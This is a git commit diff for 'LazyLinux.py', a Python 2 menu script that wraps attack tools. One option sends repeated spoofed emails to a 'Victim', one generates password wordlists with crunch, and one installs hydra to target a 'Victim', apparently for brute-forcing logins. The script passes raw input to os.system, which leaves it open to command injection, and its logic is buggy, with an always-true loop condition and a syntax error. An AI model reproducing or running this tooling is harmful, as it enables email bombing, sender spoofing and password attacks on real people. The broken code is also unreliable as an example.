eb7cc33e1f5650daabd163eb2bae54f4a8f2a16a
Eno12345 <Eno123456@users.noreply.github.com>
2017-08-13 11:35:51 -0400

    Update LazyLinux.py

--- LazyLinux.py
+++ LazyLinux.py
@@ -12,7 +12,7 @@ option = input(">")
 while option != 1 or 2 or 3 or 4 or 5 or 6:
   print"INVALID OPTION"
   choose()
- if option == 1:
+if option == 1:
    os.system('apt-get install sendemail -y')
    print "You need a STMP server. \n If you don't have one, I suggest STMP2GO.com\n\n\n"
    print ('If you want to set any of these variables as default, edit the code in "LazyLinux.py"')
@@ -23,63 +23,75 @@ while option != 1 or 2 or 3 or 4 or 5 or 6:
    sendto = raw_input("Victim: ")
    sub = raw_input("Subject: ")
    mes = raw_input("Message: ")
-   times = input("Times: ')
+   times = input("Times: ")
    for i in range(0, times):
-       os.system('sendemail -f '+spoof+' -t '+sendto+' -s '+sub+' -m '+mes+' -xu '+stmpserver+' -xp '+stmppass')
-    print("All emails sent!")
+       os.system('sendemail -f '+spoof+' -t '+sendto+' -s '+sub+' -m '+mes+' -xu '+stmpserver+' -xp '+stmppass)
+   print("All emails sent!")
 if option == 2:
     os.system('apt-get update -y')
     os.system('apt-get upgrade -y')
     os.system('apt-get dist upgrade -y')
     os.system('apt autoremove -y')
 if option == 3:
+  print "Choose Type:\n"
+  print "1. Numeric"
+  print "2. Lowercase"
+  print "3. Upercase"
+  print "4. Upercase and Lowercase"
+  print "5. Upercase and Numbers"
+  print "6. Lowercaseand Numbers"
+  print "7. Alphanumeric"
+  print "8. Alphnumeric and spaces"
+  print "9. Alphanumeric and Symbols"
+  print "10.Alphanumeric and  Symbols and Spaces"
+  print "11. Custom"
   def a():
-       print "Choose Type:\n"
-       print "1. Numeric"
-       print "2. Lowercase"
-       print "3. Upercase"
-       print "4. Upercase and Lowercase"
-       print "5. Upercase and Numbers"
-       print "6. Lowercaseand Numbers
-       print "7. Alphanumeric"
-       print "8. Alphnumeric and spaces"
-       print "9. Alphanumeric and Symbols"
-       print "10.Alphanumeric and  Symbols and Spaces"
-       print "11. Custom"
-   a()
-   type = input(">")
-   while type != 1 or 2 or 3 or 4 or 5 or 6 or 7 or 8 or 9 or 10 or 11:
+     	print "Choose Type:\n"
+        print "1. Numeric"
+        print "2. Lowercase"
+        print "3. Upercase"
+        print "4. Upercase and Lowercase"
+        print "5. Upercase and Numbers"
+        print "6. Lowercaseand Numbers"
+        print "7. Alphanumeric"
+        print "8. Alphnumeric and spaces"
+        print "9. Alphanumeric and Symbols"
+        print "10.Alphanumeric and  Symbols and Spaces"
+        print "11. Custom"
+
+  type = input(">")
+  while type != 1 or 2 or 3 or 4 or 5 or 6 or 7 or 8 or 9 or 10 or 11:
                  print "\n\n\nPlease select a vallid option."
                  sleep(4)
                  a()
                  type = input(">")
-   if type == 1:
+  if type == 1:
                  charset = "1234567890"
-   if type == 2:
+  if type == 2:
                  charset = "abcdefghijklmnopqrstuvwxyz"
-   if type == 3:
+  if type == 3:
                  charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-   if type == 4:
+  if type == 4:
                  charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
-   if type == 5:
+  if type == 5:
                  charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
-   if type == 6:
+  if type == 6:
                  charset = "abcdefghijklmnopqrstuvwxyz1234567890"
-   if type == 7:
+  if type == 7:
                  charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
-   if type == 8:
+  if type == 8:
                  charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\ "
-   if type == 9:
+  if type == 9:
                  charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@#$&*()'%-+=/;:,.?!><…~|§€£¥_^[]{}"
-   if type == 10:
+  if type == 10:
                  charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@#$&*()'%-+=/;:,.€£¥_^[]{}§|~…<>!?\ "
-   if type = 11:
+  if type = 11:
                  charset = raw_input("Type all charecters to be used: ")
-   print ("using charset "+charset+".")
-   min = raw_input("Minimum Password Leangth: ")
-   max = raw_input("Maximum Password Leangth: ")
-   os.system('apt-get install crunch -y')
-   os.system('crunch '+min+' '+max+' '+charset+' -o /root/Desktop/password.list')
+  print ("using charset "+charset+".")
+  min = raw_input("Minimum Password Leangth: ")
+  max = raw_input("Maximum Password Leangth: ")
+  os.system('apt-get install crunch -y')
+  os.system('crunch '+min+' '+max+' '+charset+' -o /root/Desktop/password.list')
 if option == 4:
    os.system('apt-get install hydra')
    victim = raw_input("Victim: ")
